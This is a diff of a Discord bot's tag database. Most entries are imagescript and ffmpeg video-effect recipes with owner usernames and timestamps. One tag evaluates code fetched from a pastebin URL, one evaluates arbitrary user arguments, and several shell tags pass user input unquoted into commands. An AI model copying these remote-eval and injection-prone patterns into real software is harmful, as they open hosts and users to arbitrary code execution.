+    "script": "{imagescript:\nload {iv} i\nwave=0;8;0;2;31;31\nhue i -135\ninvert i\npitch=0;-5\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-11T18:52:34.875Z",
+    "updatedAt": "2026-06-15T13:26:05.619Z"
+  },
+  "crying": {
+    "script": "{imagescript:\nload {iv} i\nwave=0;8;0;2;31;31\nhue i -135\ninvert i\npitch=0;-5\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-11T18:52:36.693Z",
+    "updatedAt": "2026-06-15T13:26:00.401Z"
+  },
+  "gm16": {
+    "script": "{imagescript:\nload {iv} i\nhflip i\nhuehsv i -135\ninvert i\npitch=0;-3\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-11T18:53:09.438Z",
+    "updatedAt": "2026-06-11T18:53:09.438Z"
+  },
+  "vebfisheye2": {
+    "script": "{sh:\nREPEATS={arg:0}\nFILTER=\"v360=e:hammer,scale=iw:ih,setsar=1:1\"\nCHAIN=$(printf \"$FILTER,\"%.0s $(seq 1 $REPEATS) | sed 's/,$//')\nload {iv}\n\nffmpeg -i \"$FILE_1\" -vf \"$CHAIN\" output/out.mp4\n}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-12T06:53:30.420Z",
+    "updatedAt": "2026-06-12T07:35:09.896Z"
+  },
+  "vebdefisheye2": {
+    "script": "{sh:\nREPEATS={arg:0}\nFILTER=\"v360=hammer:e,scale=iw:ih,setsar=1:1\"\nCHAIN=$(printf \"$FILTER,\"%.0s $(seq 1 $REPEATS) | sed 's/,$//')\nload {iv}\n\nffmpeg -i \"$FILE_1\" -vf \"$CHAIN\" output/out.mp4\n}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-12T06:54:08.077Z",
+    "updatedAt": "2026-06-12T07:35:48.770Z"
+  },
+  "bluelock": {
+    "script": "{attach:https://files.catbox.moe/wi2q4a.mp4}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-12T07:23:27.758Z",
+    "updatedAt": "2026-06-14T09:55:42.819Z"
+  },
+  "gm10new": {
+    "script": "{imagescript:\nload {iv} i \nmirror=90 \ninvert i\nhuehsv=180 \nswapuv i \naudiopitch=-13;12;-6;-5;-1;0;3;4;6;7;11;12\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-12T15:06:06.943Z",
+    "updatedAt": "2026-06-12T15:33:23.638Z"
+  },
+  "render": {
+    "script": "{imagescript:\nload {iv} i\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-12T15:40:42.238Z",
+    "updatedAt": "2026-06-12T15:40:42.238Z"
+  },
+  "gm17": {
+    "script": "{imagescript:\nload {iv} i\nmirror i 90\nhuehsv i -108\nfisheye i 1\nvolume i 2\npitch=0;3\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-12T15:42:56.326Z",
+    "updatedAt": "2026-06-12T15:43:00.625Z"
+  },
+  "tc": {
+    "script": "{eval:{args}}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-12T15:43:17.319Z",
+    "updatedAt": "2026-06-17T09:33:05.135Z"
+  },
+  "gm18": {
+    "script": "{imagescript:\nload {iv} i\nsaturation i 2\npitch=0;-8\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-12T15:45:07.919Z",
+    "updatedAt": "2026-06-12T15:45:07.919Z"
+  },
+  "vebfisheye3": {
+    "script": "{sh:\nREPEATS={arg:0}\nFILTER=\"v360=fisheye:22:7,scale=iw:ih,setsar=1:1\"\nCHAIN=$(printf \"$FILTER,\"%.0s $(seq 1 $REPEATS) | sed 's/,$//')\nload {iv}\nffmpeg -i \"$FILE_1\" -vf \"$CHAIN\" -pix_fmt yuv420p output/out.mp4\n}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-12T15:46:28.174Z",
+    "updatedAt": "2026-06-13T18:51:35.393Z"
+  },
+  "vebdefisheye3": {
+    "script": "{sh:\nREPEATS={arg:0}\nFILTER=\"v360=22:fisheye:7,scale=iw*2:ih*2,setsar=1:1\"\nCHAIN=$(printf \"$FILTER,\"%.0s $(seq 1 $REPEATS) | sed 's/,$//')\nload {iv}\nffmpeg -i \"$FILE_1\" -vf \"$CHAIN\" -c:v libx264 -preset fast -crf 23 -pix_fmt yuv420p output/out.mp4\n}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-12T15:46:55.901Z",
+    "updatedAt": "2026-06-12T15:53:55.648Z"
+  },
+  "gm19": {
+    "script": "{imagescript:\nload {iv} i\nswapuv i\nhuehsv i 180\nmirror i 90\npitch=-1;2\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-12T15:48:09.565Z",
+    "updatedAt": "2026-06-12T15:48:09.565Z"
+  },
+  "gm20": {
+    "script": "{imagescript:\nload {iv} i\nrightsplit(huehsv=-45)\npitch=0;-1\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-12T15:51:39.303Z",
+    "updatedAt": "2026-06-12T15:51:39.303Z"
+  },
+  "realgm20": {
+    "script": "{imagescript:\nload {iv} i\nsaturation i 2\nhuehsv i 70\ninvert i\nwave=1;1;2;2;10;10;1\nhflip i\npitch=-1;0\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-12T15:59:03.723Z",
+    "updatedAt": "2026-06-12T15:59:59.683Z"
+  },
+  "gm21": {
+    "script": "{imagescript:\nload {iv} i\nhuehsv i 18\nsaturation i 2\ninvert i\npitch=-3;0;2;4\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-12T16:03:38.114Z",
+    "updatedAt": "2026-06-12T16:03:38.114Z"
+  },
+  "mygmajor389": {
+    "script": "{imagescript:\nload {iv} i\nhuehsv i 128\ninvert i\npitch=-12;7;4,2,9,12,15\n}",
+    "ownerId": "1501331770719731792",
+    "ownerUsername": "itsrayjaightkoyettiendcutstwo",
+    "createdAt": "2026-06-12T16:08:58.191Z",
+    "updatedAt": "2026-06-12T16:08:58.191Z"
+  },
+  "trwsgmajor389": {
+    "script": "{imagescript:\nload {iv} i\nhuehsv i 128\ninvert i\npitch=-12;7;4;2;9;2;15\n}",
+    "ownerId": "1501331770719731792",
+    "ownerUsername": "itsrayjaightkoyettiendcutstwo",
+    "createdAt": "2026-06-12T16:22:36.037Z",
+    "updatedAt": "2026-06-12T16:22:36.037Z"
+  },
+  "braxtonmajor{imagescript:": {
+    "script": "load {iv} i\nhuehsv i 128\ninvert i\npitch=-12;7;4,2,9,12,15\n}",
+    "ownerId": "1501331770719731792",
+    "ownerUsername": "itsrayjaightkoyettiendcutstwo",
+    "createdAt": "2026-06-12T16:25:16.165Z",
+    "updatedAt": "2026-06-12T16:25:16.165Z"
+  },
+  "braxtonmajorfix{imagescript:": {
+    "script": "load {iv} i\nhuehsv i 128\ninvert i\npitch=-12;7;4,2,9,12,15\n}",
+    "ownerId": "1501331770719731792",
+    "ownerUsername": "itsrayjaightkoyettiendcutstwo",
+    "createdAt": "2026-06-12T16:25:35.073Z",
+    "updatedAt": "2026-06-12T16:25:35.073Z"
+  },
+  "braxtonmajor": {
+    "script": "{imagescript:\nload {iv} i\ninvert i\npitch=3;5;8;-3;-4;-9\n}",
+    "ownerId": "1501331770719731792",
+    "ownerUsername": "itsrayjaightkoyettiendcutstwo",
+    "createdAt": "2026-06-12T16:28:10.455Z",
+    "updatedAt": "2026-06-12T16:28:10.455Z"
+  },
+  "cqt": {
+    "script": "{sh:\nload {iv}\n\nffmpeg -i $FILE_1 -filter_complex \"[0:a]showcqt=s=640x360[v]\" -map [v] -map 0:a -pix_fmt yuv420p -c:a flac ./output/showcqt.mp4}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-12T16:36:34.032Z",
+    "updatedAt": "2026-06-12T16:36:34.032Z"
+  },
+  "cwt": {
+    "script": "{sh:\nload {iv}\n\nffmpeg -i $FILE_1 -filter_complex \"[0:a]showcwt=s=640x360[v]\" -map [v] -map 0:a -pix_fmt yuv420p -c:a flac ./output/showcqt.mp4}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-12T16:38:00.421Z",
+    "updatedAt": "2026-06-12T16:38:00.421Z"
+  },
+  "p1280f": {
+    "script": "```\n{if:{id}|=|1331586978503856182|then:{js:console.error(`you are banned from using this tag.`)}|else:{eval:{text:https://pastebin.com/raw/hkYTWsxA}}}\n```",
+    "ownerId": "1439196394673147905",
+    "ownerUsername": "yanis2206",
+    "createdAt": "2026-06-12T16:42:09.433Z",
+    "updatedAt": "2026-06-12T16:42:09.433Z"
+  },
+  "gm22": {
+    "script": "there are two types of gm22 you can use\n&t gm22a: recommended one\nthis uses the ovb shake\nthis is recommended for shorter rendering\n&t gm22b: uses NBFX earthquake\nthis uses the newbluefx earthquake\nthis will take long to render",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-12T16:47:32.200Z",
+    "updatedAt": "2026-06-18T13:05:34.945Z"
+  },
+  "baldi-attacks-klasky-csupo": {
+    "script": "lutzgames {attach:https://cdn.discordapp.com/attachments/1124758906376302632/1515039122534695122/resized.scale.39317657.mp4?ex=6a2d8da2&is=6a2c3c22&hm=e4b365adc3911ed72efad50189b2de33e461f15b309c2175e558702656c0a912&}",
+    "ownerId": "1233340285044523109",
+    "ownerUsername": "bride_junior.",
+    "createdAt": "2026-06-12T17:38:10.217Z",
+    "updatedAt": "2026-06-12T17:38:10.217Z"
+  },
+  "vw2cc": {
+    "script": "{tag:vegaswavetoclankeredchuan}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-12T17:55:16.038Z",
+    "updatedAt": "2026-06-12T17:55:16.038Z"
+  },
+  "gm23": {
+    "script": "{imagescript:\nload {iv} i\nhflip i\nhuehsv i -135\npitch=-3;0;0;3\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-12T18:10:11.129Z",
+    "updatedAt": "2026-06-12T18:10:36.313Z"
+  },
+  "wdp": {
+    "script": "fho",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-12T18:18:53.229Z",
+    "updatedAt": "2026-06-12T18:18:53.229Z"
+  },
+  "gm24": {
+    "script": "{imagescript:\nload {iv} i\nlut=https://files.catbox.moe/yl52eo.cube\nwave=0;8;0;2;31;31\nmirror=270\npitch=-2;3;5\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-12T18:21:25.282Z",
+    "updatedAt": "2026-06-18T18:32:11.022Z"
+  },
+  "am": {
+    "script": "am",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-13T05:19:57.504Z",
+    "updatedAt": "2026-06-13T05:19:57.504Z"
+  },
+  "100thtag": {
+    "script": "o",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-13T05:20:08.050Z",
+    "updatedAt": "2026-06-13T05:20:08.050Z"
+  },
+  "gm91": {
+    "script": "{imagescript :load channelblend, huehsv, mirror, gm91deform, pitch`\nUse `&sync` To Make IHTX better",
+    "ownerId": "1439196394673147905",
+    "ownerUsername": "yanis2206",
+    "createdAt": "2026-06-13T10:07:25.438Z",
+    "updatedAt": "2026-06-13T10:07:25.438Z"
+  },
+  "gm22b": {
+    "script": "{imagescript:\nload {iv} i\ninvert i\nhuehsv i 180\nnbfxearthquake i\nautotune=https://files.catbox.moe/ycj49o.mp4\npitch=-2\nacontrast i 100\nacontrast i 100\nacontrast i 100\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-13T15:06:12.246Z",
+    "updatedAt": "2026-06-18T12:59:11.902Z"
+  },
+  "gm22a": {
+    "script": "{imagescript:\nload {iv} i\ninvert i\nhuehsv i 180\nshake i 15\nautotune=https://files.catbox.moe/ycj49o.mp4\npitch=-2\nacontrast i 100\nacontrast i 100\nacontrast i 100\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-13T15:11:16.277Z",
+    "updatedAt": "2026-06-18T12:58:58.748Z"
+  },
+  "confusion": {
+    "script": "{imagescript:\nload {iv} i\ninvlum i\nmirror i 90\nareverse i\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-13T15:11:46.210Z",
+    "updatedAt": "2026-06-13T15:11:46.210Z"
+  },
+  "confusion+gm4": {
+    "script": "{imagescript:\nload {iv} i\ngm4\ninvlum i\nmirror i 90\nareverse i\npitch=0;5\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-13T15:12:53.448Z",
+    "updatedAt": "2026-06-13T15:12:53.448Z"
+  },
+  "confusion+realgm4": {
+    "script": "{imagescript:\nload {iv} i\nrealgm4 i\ninvlum i\nmirror i 90\nareverse i\npitch=0;5\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-13T15:13:26.929Z",
+    "updatedAt": "2026-06-13T15:13:38.556Z"
+  },
+  "gm25": {
+    "script": "{imagescript:\nload {iv} i\nhuehsv i -45\npitch=-8;-1\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-13T15:19:05.871Z",
+    "updatedAt": "2026-06-13T15:19:05.871Z"
+  },
+  "chorded": {
+    "script": "{imagescript:\nload {iv} i\nlut=https://cdn.discordapp.com/attachments/1124758906376302632/1515375600032809011/chorded.cube?ex=6a2ec701&is=6a2d7581&hm=480b268d7df4e9b6997009c9d500c8789e5940752bbd187994c2211099cbdbdc&\nautotune=https://cdn.discordapp.com/attachments/1124758906376302632/1515375943466619170/youtube-xtw0oljfs6i.66851a01.mp4?ex=6a2ec753&is=6a2d75d3&hm=bc39adba4fdc25828f826016e56335ce186f7b23f050d5e193cca4d8a5702cc4&\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-13T15:23:45.473Z",
+    "updatedAt": "2026-06-13T15:23:45.473Z"
+  },
+  "chorded+gm4": {
+    "script": "{imagescript:\nload {iv} i\nlut=https://cdn.discordapp.com/attachments/1124758906376302632/1515375600032809011/chorded.cube?ex=6a2ec701&is=6a2d7581&hm=480b268d7df4e9b6997009c9d500c8789e5940752bbd187994c2211099cbdbdc&\ngm4 i\nautotune=https://cdn.discordapp.com/attachments/1124758906376302632/1515375943466619170/youtube-xtw0oljfs6i.66851a01.mp4?ex=6a2ec753&is=6a2d75d3&hm=bc39adba4fdc25828f826016e56335ce186f7b23f050d5e193cca4d8a5702cc4&\npitch=0;5\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-13T15:25:06.706Z",
+    "updatedAt": "2026-06-13T15:25:06.706Z"
+  },
+  "chorded+realgm4": {
+    "script": "{imagescript:\nload {iv} i\nlut=https://cdn.discordapp.com/attachments/1124758906376302632/1515375600032809011/chorded.cube?ex=6a2ec701&is=6a2d7581&hm=480b268d7df4e9b6997009c9d500c8789e5940752bbd187994c2211099cbdbdc&\nrealgm4 i\nautotune=https://cdn.discordapp.com/attachments/1124758906376302632/1515375943466619170/youtube-xtw0oljfs6i.66851a01.mp4?ex=6a2ec753&is=6a2d75d3&hm=bc39adba4fdc25828f826016e56335ce186f7b23f050d5e193cca4d8a5702cc4&\npitch=0;5\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-13T15:25:17.997Z",
+    "updatedAt": "2026-06-13T15:25:17.997Z"
+  },
+  "angryx": {
+    "script": "{imagescript:\nload {iv} i\nswapuv i\ninvert i\nhuehsv i 60\nfisheye=-0.7\nmirror=90\npitch=0;-2\nacontrast=100\nacontrast=100\nacontrast=100\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-13T15:31:40.815Z",
+    "updatedAt": "2026-06-13T15:33:58.967Z"
+  },
+  "angryandhappy": {
+    "script": "{imagescript: \nload {iv} i \nswapuv i \nhuehsv=60 i\ninvert i\nmirror=90 i \nfisheye=-0.875 i \ninvert i\nhuehsv=180 i\nhflip i\nwave=0;6;0;6;21;21 i\nhflip i\nadestroy i\nautotune=https://cdn.discordapp.com/attachments/1124758906376302632/1515371049699770478/youtube-52k-8nkko-m.8b53c298.mp4?ex=6a2ec2c4&is=6a2d7144&hm=c331fb42125c1c002d52fef8aea630a9fcc5aa51453ffde159331e68ee40ba3f&\npitch=0;10 }",
+    "ownerId": "1498718091734024355",
+    "ownerUsername": "sm14cheryl_84874",
+    "createdAt": "2026-06-13T15:33:57.511Z",
+    "updatedAt": "2026-06-13T15:42:17.652Z"
+  },
+  "angry_x": {
+    "script": "{imagescript:\nload {iv} i\nswapuv i\ninvert i\nhuehsv i 60\nfisheye=-0.7\nmirror=90\npitch=0;-2\nacontrast=100\nacontrast=100\nacontrast=100\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-13T15:34:19.252Z",
+    "updatedAt": "2026-06-13T15:34:19.252Z"
+  },
+  "angryeffect": {
+    "script": "{imagescript:\nload {iv} i\nswapuv i\ninvert i\nhuehsv i 60\nfisheye=-0.7\nmirror=90\npitch=0;-2\nacontrast=100\nacontrast=100\nacontrast=100\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-13T15:34:23.415Z",
+    "updatedAt": "2026-06-13T15:34:23.415Z"
+  },
+  "angry_effect": {
+    "script": "{imagescript:\nload {iv} i\nswapuv i\ninvert i\nhuehsv i 60\nfisheye=-0.7\nmirror=90\npitch=0;-2\nacontrast=100\nacontrast=100\nacontrast=100\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-13T15:34:27.606Z",
+    "updatedAt": "2026-06-13T15:34:27.606Z"
+  },
+  "happy": {
+    "script": "{imagescript: \nload {iv} i \ninvert i \nhuehsv=180 i \nhflip i \nwave=0;6;0;6;21;21 i \nhflip i \npitch=4;12 }",
+    "ownerId": "1498718091734024355",
+    "ownerUsername": "sm14cheryl_84874",
+    "createdAt": "2026-06-13T15:34:39.949Z",
+    "updatedAt": "2026-06-13T15:42:02.704Z"
+  },
+  "deform": {
+    "script": "load {iv} i\ngm91deform=1",
+    "ownerId": "1501331770719731792",
+    "ownerUsername": "itsrayjaightkoyettiendcutstwo",
+    "createdAt": "2026-06-13T15:43:14.440Z",
+    "updatedAt": "2026-06-13T15:43:14.440Z"
+  },
+  "blind": {
+    "script": "{imagescript:\nload {iv} i\ninvert i\nhue i -45\nfisheye=-2;0.36;0.36;0.5\nmirror i 90\npitch=-5;-3\n}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-13T18:27:21.609Z",
+    "updatedAt": "2026-06-13T18:27:21.609Z"
+  },
+  "blindx": {
+    "script": "{imagescript:\nload {iv} i\ninvert i\nhue i -45\nfisheye=-2;0.36;0.36;0.5\nmirror i 90\npitch=-5;-3\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-13T18:28:53.995Z",
+    "updatedAt": "2026-06-13T18:28:53.995Z"
+  },
+  "blind_x": {
+    "script": "{imagescript:\nload {iv} i\ninvert i\nhue i -45\nfisheye=-2;0.36;0.36;0.5\nmirror i 90\npitch=-5;-3\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-13T18:28:58.312Z",
+    "updatedAt": "2026-06-13T18:28:58.312Z"
+  },
+  "blindmajor": {
+    "script": "{imagescript:\nload {iv} i\nhuehsv i 75\ninvert i\nfisheye=2;0.35;0.4;0.75\nmirror=90\npitch=-3;-5;-6;-8\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-13T18:33:40.465Z",
+    "updatedAt": "2026-06-13T18:33:40.465Z"
+  },
+  "blind_major": {
+    "script": "{imagescript:\nload {iv} i\nhuehsv i 75\ninvert i\nfisheye=2;0.35;0.4;0.75\nmirror=90\npitch=-3;-5;-6;-8\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-13T18:33:45.583Z",
+    "updatedAt": "2026-06-13T18:33:45.583Z"
+  },
+  "deaf": {
+    "script": "{imagescript:\nload {iv} i\nswapuv i\ninvert i\nhuehsv i -144\nfisheye=2;0.95\nmirror i 270\npitch=22;24\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-13T18:38:20.758Z",
+    "updatedAt": "2026-06-13T18:38:20.758Z"
+  },
+  "deaf_x": {
+    "script": "{imagescript:\nload {iv} i\nswapuv i\ninvert i\nhuehsv i -144\nfisheye=2;0.95\nmirror i 270\npitch=22;24\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-13T18:38:35.484Z",
+    "updatedAt": "2026-06-13T18:38:35.484Z"
+  },
+  "deafx": {
+    "script": "{imagescript:\nload {iv} i\nswapuv i\ninvert i\nhuehsv i -144\nfisheye=2;0.95\nmirror i 270\npitch=22;24\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-13T18:38:38.844Z",
+    "updatedAt": "2026-06-13T18:38:38.844Z"
+  },
+  "ikilledx": {
+    "script": "{imagescript:\nload {iv} k\nhuehsv i -118\nfisheye=2\npitch=-8\n}",
+    "ownerId": "1514676145788817506",
+    "ownerUsername": "kazbekgkt",
+    "createdAt": "2026-06-13T18:39:57.860Z",
+    "updatedAt": "2026-06-13T18:39:57.860Z"
+  },
+  "deafmajor": {
+    "script": "{imagescript:\nload {iv} i\ninvert i\nfisheye=2;0.75\nmirror i 270\npitch=22;24;27;29\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-13T18:42:46.792Z",
+    "updatedAt": "2026-06-13T18:42:46.792Z"
+  },
+  "deaf_major": {
+    "script": "{imagescript:\nload {iv} i\ninvert i\nfisheye=2;0.75\nmirror i 270\npitch=22;24;27;29\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-13T18:43:16.976Z",
+    "updatedAt": "2026-06-13T18:43:16.976Z"
+  },
+  "fte": {
+    "script": "{tag:ffmpeg}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-13T18:46:11.378Z",
+    "updatedAt": "2026-06-13T18:46:11.378Z"
+  },
+  "gm_fixed": {
+    "script": "{imagescript:\nload {iv} i\ninvert i\npitch=-12\npitch=-5\npitch=0\npitch=4\npitch=7\npitch=12\n}",
+    "ownerId": "1514676145788817506",
+    "ownerUsername": "kazbekgkt",
+    "createdAt": "2026-06-13T18:49:23.333Z",
+    "updatedAt": "2026-06-13T18:49:23.333Z"
+  },
+  "congabusher": {
+    "script": "{imagescript:\nload {iv} i\nhue i -120\nmirror i 270\nvibrato=3000;0.1\nvolume i 2\nvibrato=3000;0.2\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-13T18:49:47.336Z",
+    "updatedAt": "2026-06-13T18:49:47.336Z"
+  },
+  "orb": {
+    "script": "{sh:\nload {iv}\nffmpeg -i \"$FILE_1\" -vf \"scroll=0.05,scale=512:512:force_original_aspect_ratio=increase,crop=512:512,v360=e:hammer,v360=fisheye:22:7,crop=min(iw\\,ih):min(iw\\,ih),format=rgba,geq=r='r(X,Y)':g='g(X,Y)':b='b(X,Y)':a='if(gt(pow(X-W/2,2)+pow(Y-H/2,2),pow(min(W,H)/2,2)),0,255)'\" -pix_fmt yuv420p output/orb.mp4\n}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-13T18:50:23.935Z",
+    "updatedAt": "2026-06-13T18:50:23.935Z"
+  },
+  "conga_busher": {
+    "script": "{imagescript:\nload {iv} i\nhue i -120\nmirror i 270\nvibrato=3000;0.1\nvolume i 2\nvibrato=3000;0.2\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-13T18:50:35.410Z",
+    "updatedAt": "2026-06-13T18:50:35.410Z"
+  },
+  "gm4_ffmpeg": {
+    "script": "{set:offset|1}\n{set:b|{js:let user = discord.user.username;\nlet bannedusers = ['isaq0095','blue.l0ck','mpgarv','samsunggalaxys12','kitokopocki','mtgsheothegamer0982','mtgsheothegamer','btot15k5','wusjrzzkuzj283sgmail.com','vegaspro8.01994','papovalverde','upgradedwegaaple','rocholo_javinar.','theonewusu','kokos0036','ps5gve2008_66775','mclaren645017'];\nconsole.log(bannedusers.includes(user))}} {set:bta|{js:let tag = discord.tag.id;\nlet bannedtags = [789151810588886399,789151833988908416];\nconsole.log(bannedtags.includes(tag))}}{if:{get:b}|=|true|then:{js:console.error(`You are banned for using G-Major 4 and all of its tag aliases.`)}|else:{if:{get:bta}|=|true|then:{js:console.error(`This alias is banned for using.`)}|else:{set:unix|{unix}} {imagescript:\nload {iv} i\nget i width w\nget i height h\ncopy i a\ncreate bg w h 0 0 0 100\noverlay bg i 0 0 #ffffff 0.1 0.4\naudioputreplace i a\ncopy bg bg2\naudiopitch bg2 2**(5/12)\naudioputmix bg bg2\nvolume bg 2\n}\n-# Took {math:({unix}-{get:unix})/1000} seconds}}",
+    "ownerId": "1514676145788817506",
+    "ownerUsername": "kazbekgkt",
+    "createdAt": "2026-06-13T18:52:40.711Z",
+    "updatedAt": "2026-06-13T18:54:51.546Z"
+  },
+  "gm26": {
+    "script": "{imagescript:\nload {iv} i\nthreshold i 100\nhuehsv i 180\npitch=16\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-13T18:54:19.986Z",
+    "updatedAt": "2026-06-13T18:54:47.611Z"
+  },
+  "gm27": {
+    "script": "{imagescript:\nload {iv} i\ntvsim i 0.5\ninvert i\nthreshold i 125\ninvert i\ngradientmap=[[0,216,0,255],[255,255,0,255],[255,255,0,255]]\nthreshold i 100\npitch=-12;-8;-5;0;2;3;4;4;6;7\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-13T19:03:11.801Z",
+    "updatedAt": "2026-06-13T19:03:11.801Z"
+  },
+  "backwardsmajor": {
+    "script": "{imagescript:\nload {iv} i\nvreverse i\nareverse i\nhflip i\nswapuv i\nhuehsv i 180\npitch=-6\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-13T19:05:03.721Z",
+    "updatedAt": "2026-06-13T19:05:53.255Z"
+  },
+  "backwards_major": {
+    "script": "{imagescript:\nload {iv} i\nvreverse i\nareverse i\nhflip i\nswapuv i\nhuehsv i 180\npitch=-6\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-13T19:06:15.095Z",
+    "updatedAt": "2026-06-13T19:06:15.095Z"
+  },
+  "gm27_v2": {
+    "script": "{imagescript:\nload {iv} i\nhflip i\nswapuv i\nhuehsv i 180\npitch=-6\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-13T19:06:38.366Z",
+    "updatedAt": "2026-06-13T19:06:38.366Z"
+  },
+  "gm27v2": {
+    "script": "{imagescript:\nload {iv} i\nhflip i\nswapuv i\nhuehsv i 180\npitch=-6\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-13T19:06:40.760Z",
+    "updatedAt": "2026-06-13T19:06:40.760Z"
+  },
+  "ikilled": {
+    "script": "{imagescript:\nload {iv} i\nhuehsv i -120\nfisheye=2\npitch=-8\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-13T19:07:48.865Z",
+    "updatedAt": "2026-06-13T19:07:48.865Z"
+  },
+  "i_killed": {
+    "script": "{imagescript:\nload {iv} i\nhuehsv i -120\nfisheye=2\npitch=-8\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-13T19:08:30.325Z",
+    "updatedAt": "2026-06-13T19:08:30.325Z"
+  },
+  "i_killed_x": {
+    "script": "{imagescript:\nload {iv} i\nhuehsv i -120\nfisheye=2\npitch=-8\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-13T19:08:42.277Z",
